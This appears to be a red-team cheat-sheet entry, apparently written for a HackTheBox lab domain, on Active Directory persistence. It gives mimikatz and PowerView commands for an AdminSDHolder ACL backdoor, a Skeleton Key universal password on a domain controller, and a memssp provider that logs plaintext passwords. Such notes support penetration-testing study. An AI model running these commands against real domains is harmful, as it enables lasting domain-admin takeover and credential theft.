# 15.01 AdminSDHolder Skeleton Key Malicious SSP

> Persist via AdminSDHolder ACL (re-applied by SDProp), Skeleton Key universal password, or `memssp` plaintext-logging SSP.

## Overview

AdminSDHolder ACL modifications persist after SDProp runs (~1h), giving a user full control over all protected AD groups. Skeleton key patches LSASS on the DC to accept a universal password (not persistent across reboots). Malicious SSP (memssp) logs plaintext credentials to mimilsa.log.

## Steps

- Grant a user Full Control on AdminSDHolder via PowerView Add-DomainObjectAcl with TargetIdentity pointing to the AdminSDHolder CN.
- After ~1h SDProp propagates, the user gains Full Control over Domain Admins, Enterprise Admins, etc.
- Skeleton key: upload mimikatz to DC, run `misc::skeleton`; any user can now authenticate with password "mimikatz".
- Malicious SSP: run `misc::memssp` in mimikatz; next user logon writes plaintext password to C:\Windows\System32\mimilsa.log.

## Commands

### AdminSDHolder ACL backdoor

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=child,DC=htb,DC=local" -PrincipalIdentity eric -Rights All
```

### Upload mimikatz to DC

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload mimikatz.exe
```

### Skeleton key

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

### Malicious SSP memssp

```text
mimikatz # misc::memssp
```
